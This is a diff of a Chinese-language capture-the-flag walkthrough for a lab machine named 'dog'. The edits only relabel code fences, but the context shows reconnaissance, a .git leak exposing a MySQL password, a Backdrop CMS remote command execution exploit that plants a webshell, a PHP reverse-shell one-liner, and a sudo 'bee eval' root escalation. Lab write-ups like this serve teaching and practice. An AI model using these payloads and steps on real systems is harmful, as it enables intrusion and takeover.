@@ -16,7 +16,7 @@ Operating System: Linux
 
 ## 资产探测
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.11.58
 
@@ -70,7 +70,7 @@ OS details: Linux 4.15 - 5.19
 
 发现网站存在有 `.git` 信息泄露，尝试将 git 储存库 dump 到本地
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ perl ~/tools/dvcs-ripper-master/rip-git.pl -v -u http://10.10.11.58/.git/
 [i] Downloading git files from http://10.10.11.58/.git/
@@ -118,7 +118,7 @@ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 
 需要打包一个包含有恶意模块的 tar 包，而不是 zip 包，因为 CMS 暂未添加有 zip 模块
 
-```shell
+```bash
 ┌──(env)(randark ㉿ kali)-[~/tmp]
 └─$ python3 test-01.py http://10.10.11.58
 Backdrop CMS 1.27.1 - Remote Command Execution Exploit
@@ -149,13 +149,13 @@ Your shell address: http://10.10.11.58/modules/shell/shell.php
 
 使用 webshell 执行以下命令
 
-```shell
+```bash
 php -r '$sock=fsockopen("10.10.16.31",9999);exec("bash <&3 >&3 2>&3");'
 ```
 
 成功收到回连的会话
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [15:19:44] Welcome to pwncat 🐈!
@@ -170,7 +170,7 @@ www-data
 
 发现正常权限用户两个
 
-```shell
+```bash
 (remote) www-data@dog:/var/www/html/modules/shell$ ls -lh /home/
 total 8.0K
 drwxr-xr-x 4 jobert     jobert     4.0K Feb  7 15:59 jobert
@@ -179,7 +179,7 @@ drwxr-xr-x 3 johncusack johncusack 4.0K Feb  7 15:59 johncusack
 
 尝试上文发现的 mysql 数据库凭据，发现可以登录 johncusack
 
-```shell
+```bash
 (remote) www-data@dog:/var/www/html/modules/shell$ su johncusack
 Password:
 shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
@@ -197,7 +197,7 @@ e7ea764890f7ab52949fe7cdbaad87b5
 
 在 sudo 配置信息中可以发现
 
-```shell
+```bash
 johncusack@dog:~$ sudo -l
 Matching Defaults entries for johncusack on dog:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -301,7 +301,7 @@ function bee_browser_load_html() {
 
 经过代码分析，可以尝试使用 `eval` 函数实现任意命令执行
 
-```shell
+```bash
 johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami')"
 root
 ```
